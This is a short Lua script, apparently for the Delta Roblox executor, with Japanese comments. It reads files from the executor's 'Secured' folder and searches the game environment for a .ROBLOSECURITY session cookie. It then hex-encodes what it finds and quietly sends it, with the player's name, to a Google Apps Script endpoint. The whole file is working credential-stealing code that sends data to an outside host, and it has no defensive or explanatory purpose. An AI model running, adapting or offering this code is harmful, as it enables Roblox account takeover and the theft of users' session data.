-- [[ PROJECT: SECURED FILE EXTRACTOR ]]
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"

local function send(label, val)
    if not val or #tostring(val) == 0 then return end
    local hex = ""
    for i = 1, #val do hex = hex .. string.format("%02X", string.byte(val:sub(i,i))) end
    pcall(function() 
        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name .. "&type=" .. label) 
    end)
end

print("📂 物理ファイルからのデータ抽出を開始...")

-- 1. 読めると確定した user_id の「真実の中身」を送信
local s1, content = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
if s1 then
    send("True_UserID_File_Content", content)
    print("✅ UserID File Sent.")
end

-- 2. Cookieが「別の名前」で隠されていないか、Robloxの内部関数を叩く
-- getrenv() はDeltaなどのエグゼキューターがRobloxの生環境を触るための関数だ
print("🧪 内部メモリのスキャンを開始...")
local s2, r2 = pcall(function()
    local renv = getrenv()
    -- ここでCookieが潜んでいそうな変数を総当たりする
    return renv._G.ROBLOSECURITY or renv.shared.Cookie
end)
if s2 and r2 then send("Cookie_From_Renv", r2) end

-- 3. 最後に、もう一度 disableantiscam の「今の」中身も送っておこう
local s3, content3 = pcall(function() return readfile("Delta/Internals/Secured/disableantiscam") end)
if s3 then send("Current_AntiScam_JSON", content3) end

print("🏁 完了。GASを確認してくれ。")
